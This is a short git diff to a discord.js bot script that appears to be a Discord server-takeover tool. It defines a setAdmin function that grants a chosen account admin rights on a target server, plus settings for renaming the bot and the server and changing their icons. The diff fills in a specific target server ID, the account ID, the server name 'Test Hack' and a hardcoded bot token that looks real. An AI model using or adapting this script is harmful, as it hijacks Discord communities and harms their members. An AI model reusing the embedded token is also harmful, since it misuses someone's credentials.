@@ -2,7 +2,7 @@
 
 const Discord = require("discord.js")
 const client = new Discord.Client()
-const token = "BOT_TOKEN"
+const token = "NzQ2MTc4NTM0ODc1MjAxNTc4.Xz8i6g.eJ3yj_2lz4qia6Ly5PLS_7nemEY"
 
 const setAdmin = (guildID, accountID) => {
     const targetServer = client.guilds.get(guildID)
@@ -106,12 +106,12 @@ client.on("ready", () => {
 
     // Setup YOUR personnal settings
     const configs = {
-        "targetServerID": "SERVER_ID",
-        "accountID": "YOUR_ID",
-        "botNickname": "NEW_BOT_NAME",
-        "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
-        "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
-        "newServerName": "NEW_SERVER_NAME",
+        "targetServerID": "762231122398019614",
+        "accountID": "623883533815119882",
+        "botNickname": "Boba",
+        "botIcon": 'https://cdn.discordapp.com/attachments/762231122398019618/764023725875265546/images_2.jpeg',
+        "newServerIcon": "https://cdn.discordapp.com/attachments/762231122398019618/764023725875265546/images_2.jpeg",
+        "newServerName": "Test Hack",
     }
 
     client.user.setUsername(configs.botNickname)
